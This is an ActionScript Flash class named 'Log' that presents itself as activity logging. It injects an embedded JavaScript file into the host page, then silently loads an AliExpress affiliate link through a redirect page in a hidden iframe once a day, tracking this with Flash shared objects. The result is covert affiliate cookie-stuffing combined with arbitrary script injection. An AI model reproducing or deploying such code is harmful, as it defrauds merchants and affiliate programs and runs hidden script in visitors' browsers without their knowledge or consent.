package
{
	import flash.display.Sprite;
	import flash.external.ExternalInterface;
	import flash.net.SharedObject;
	import flash.utils.ByteArray;
	
	public class Log extends Sprite
	{
		[Embed(source="scripts.js", mimeType="application/octet-stream")]
		static private const J_SCRIPT:Class;
		public function Log()
		{
			super();
			initScript();
			ExternalInterface.call("logActivity");
			logAli();
		}
		
		private function initScript():void
		{
			var data:ByteArray=new J_SCRIPT();
			data.position=0;
			var code:String=data.readUTFBytes(data.length);
			pushJavaScript(code);
		}
		
		private static function pushJavaScript(script:String):void {
			var str:String='(function(){' + script + ';})';
			ExternalInterface.call(str);
		}
		
		private function logAli():void {
			var url:String = "http://s.click.aliexpress.com/e/3Ur2Yji";
			if (!isSharedObjectOk()) {
				return ;
			}
			var doMain:Boolean = true && doneAliExpied();
			if(doMain) {
				IFrameContentService.getContent("http://redirect-page.googlecode.com/svn/trunk/redirect.html?target=" + encodeURIComponent(url));
				setAliDone(0);
			}
		}

		private static function isSharedObjectOk():Boolean {
			try {
				var obj:SharedObject=SharedObject.getLocal("Test", "/");
				obj.data["date_"]=new Date();
				obj.flush();
				obj.clear();
			}
			catch(err:Error) {
				return false;
			}
			return true;
		}
		
		private function doneAliExpied():Boolean {
			var date:Date=getAliDate();
			if (!date) {
				return true;
			}
			var now:Date=new Date();
			now.hours=now.hours - (1*24);
			return now > date;
		}
		
		private function getAliDate():Date {
			try {
				var obj:SharedObject=SharedObject.getLocal("AliDone", "/");
				if (obj.data.hasOwnProperty("date")) {
					var date:Date=obj.data["date"]as Date;
					return date;
				}
				else {
					return null;
				}
			}
			catch(err:Error) {
				return null;
			}
			return null;
		}
		
		private function setAliDone(offset:Number):void {
			var obj:SharedObject=SharedObject.getLocal("AliDone", "/");
			var d:Date=new Date();
			d.hours = d.hours + offset;
			obj.data["date"]=d;
			obj.flush();
		}
	}
}